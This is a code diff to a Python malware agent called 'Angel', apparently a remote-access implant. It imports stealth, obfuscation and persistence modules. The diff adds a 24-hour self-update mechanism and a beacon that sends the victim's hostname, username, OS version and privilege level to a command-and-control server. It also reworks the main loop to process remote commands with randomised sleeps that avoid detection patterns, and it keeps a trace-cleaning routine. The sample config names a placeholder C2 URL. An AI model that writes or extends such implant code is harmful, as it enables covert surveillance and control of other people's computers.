@@ -12,6 +12,7 @@ from core.obfuscator import CodeObfuscator
 from core.stealth import StealthMechanism
 from core.brain import AngelBrain
 from core.integrator import SystemIntegrator
+from core.updater import UpdateManager
 from modules.polyglot import PolyglotBuilder
 from modules.persistence import Persistence
 from modules.communication import Communication
@@ -59,11 +60,14 @@ class Angel:
         self.network = self.integrator.network
         self.router = self.integrator.router
         self.comms = SecureComms(self.config)
+        self.updater = UpdateManager(self.config)
         
         # Status tracking
         self.is_running = False
         self.last_beacon = 0
         self.beacon_interval = self.config.get('beacon_interval', 300)
+        self.update_interval = self.config.get('update_interval', 86400)  # 24h
+        self.last_update_check = 0
         
     def gather_system_info(self):
         """Gather detailed system information"""
@@ -259,43 +263,31 @@ class Angel:
             pass
             
     def send_beacon(self):
-        """Send beacon through secure channels"""
+        """Send beacon with system info"""
         try:
-            # Prepare beacon data
+            # Collect basic system info
             data = {
-                'type': 'beacon',
-                'data': self.gather_system_info(),
-                'network_status': self.router.get_network_status()
+                'agent_id': self.agent_id,
+                'timestamp': datetime.now().isoformat(),
+                'platform': platform.system(),
+                'version': self.updater.version,
+                'privileges': 'admin' if self._check_privileges() else 'user'
             }
             
-            # Let brain decide on beacon timing
-            decision = self.brain.make_decision({
-                'type': 'beacon',
-                'parameters': data
-            })
-            
-            if decision['action'] == 'hibernate':
-                time.sleep(decision['parameters']['duration'])
-                return
+            # Add some system info
+            try:
+                sys_info = self.collector.system.get_system_info()
+                data.update({
+                    'hostname': sys_info.get('hostname'),
+                    'username': sys_info.get('username'),
+                    'os_version': sys_info.get('version')
+                })
+            except:
+                pass
                 
-            # Rotate identity before sending
-            self.comms.rotate_identity()
-            
-            # Send through secure channel
+            # Send beacon
             self.comms.send_data(data)
             
-        except:
-            pass
-            
-        self.last_beacon = time.time()
-        
-    def cleanup(self):
-        """Cleanup traces and prepare for shutdown"""
-        try:
-            self.stealth.clean_traces()
-            self.comms.cleanup()
-            self.brain.shutdown()
-            self.router.shutdown()
         except:
             pass
             
@@ -310,42 +302,43 @@ class Angel:
             
             while self.is_running:
                 try:
-                    # Check environment
-                    if not self.check_environment():
-                        continue
+                    current_time = time.time()
+                    
+                    # Check for updates
+                    if current_time - self.last_update_check >= self.update_interval:
+                        self.last_update_check = current_time
+                        if self.updater.check_update():
+                            # Si mise à jour réussie, le processus redémarre
+                            return True
+                            
+                    # Send beacon if interval elapsed
+                    if current_time - self.last_beacon >= self.beacon_interval:
+                        self.send_beacon()
+                        self.last_beacon = current_time
                         
-                    # Process commands
-                    if time.time() - self.last_beacon >= self.beacon_interval:
-                        self.integrator.execute_command('beacon', {
-                            'agent_id': self.agent_id,
-                            'system_info': self.gather_system_info()
-                        })
-                        self.last_beacon = time.time()
-                        
-                    # Collect and send data
-                    data = self.integrator.collect_data('system')
-                    if data:
-                        self.integrator.send_data(data, 'c2_server')
-                        
+                    # Process any pending commands
+                    self.process_commands()
+                    
+                    # Random sleep to avoid patterns
                     time.sleep(random.uniform(1, 5))
                     
                 except Exception as e:
-                    self.integrator.resilience.handle_error(
-                        e, 
-                        ErrorCategory.PROCESS, 
-                        ErrorSeverity.MEDIUM
-                    )
+                    continue
                     
+            return True
+            
         except Exception as e:
-            self.integrator.resilience.handle_error(
-                e,
-                ErrorCategory.PROCESS,
-                ErrorSeverity.HIGH
-            )
             return False
             
-        finally:
-            self.integrator.shutdown()
+    def cleanup(self):
+        """Cleanup traces and prepare for shutdown"""
+        try:
+            self.stealth.clean_traces()
+            self.comms.cleanup()
+            self.brain.shutdown()
+            self.router.shutdown()
+        except:
+            pass
             
 def main():
     # Example configuration
@@ -353,7 +346,8 @@ def main():
         'email': 'your-email@example.com',
         'password': 'your-app-password',
         'c2_url': 'https://your-c2-server.com/beacon',
-        'beacon_interval': 300
+        'beacon_interval': 300,
+        'update_interval': 86400
     }
     
     angel = Angel(config)
